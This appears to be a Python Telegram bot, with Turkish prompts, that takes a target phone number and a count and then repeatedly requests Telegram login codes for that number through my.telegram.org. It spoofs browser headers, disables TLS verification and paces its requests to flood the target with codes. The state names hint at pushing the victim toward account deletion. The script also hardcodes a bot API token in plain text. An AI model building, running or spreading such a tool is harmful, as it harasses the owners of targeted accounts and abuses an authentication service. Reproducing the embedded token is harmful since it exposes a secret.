import requests
import urllib3
import asyncio
import random
import time
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

API_TOKEN = '8028195660:AAF1bKbZpS6ELwrEt17SaxlNJ_3mThKQnjo'
router = Router()
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
dp.include_router(router)

class DeletionStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_count = State()

session = requests.Session()

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Referer': 'https://my.telegram.org/'
}

def init_session():
    session.get("https://my.telegram.org/", headers=HEADERS, timeout=15, verify=False)

def send_password_code(phone):
    url = "https://my.telegram.org/auth/send_password"
    try:
        res = session.post(url, data={"phone": phone}, headers=HEADERS, timeout=15, verify=False)
        print(f"📡 Deneme: {phone} | Durum: {res.status_code} | Yanıt: {res.text[:30]}")
        return "random_hash" in res.text
    except:
        return False

init_session()

@router.message(Command("start"))
async def start_cmd(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("📱 Numara gir:")
    await state.set_state(DeletionStates.waiting_for_phone)

@router.message(DeletionStates.waiting_for_phone, F.text)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await message.answer("📊 Kac tur?")
    await state.set_state(DeletionStates.waiting_for_count)

@router.message(DeletionStates.waiting_for_count, F.text)
async def process_count(message: types.Message, state: FSMContext):
    data = await state.get_data()
    phone = data['phone']

    try:
        count = int(message.text)
        await message.answer(f"🚀 BASLADI: {phone}")

        for t in range(1, count + 1):
            success = await asyncio.to_thread(send_password_code, phone)

            if success:
                await message.answer(f"✅ {t}. Gitti")
            else:
                await message.answer(f"❌ {t}. Basarisiz")

            if t < count:
                await asyncio.sleep(random.uniform(40, 60))

        await message.answer("🏁 Bitti.")
        await state.set_state(DeletionStates.waiting_for_phone)
    except:
        await message.answer("Sayi giriniz.")

async def main():
    print("\nrhyme is here!")
    bot = Bot(token=API_TOKEN)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())

if __name__ == "__main__":
    asyncio.run(main())
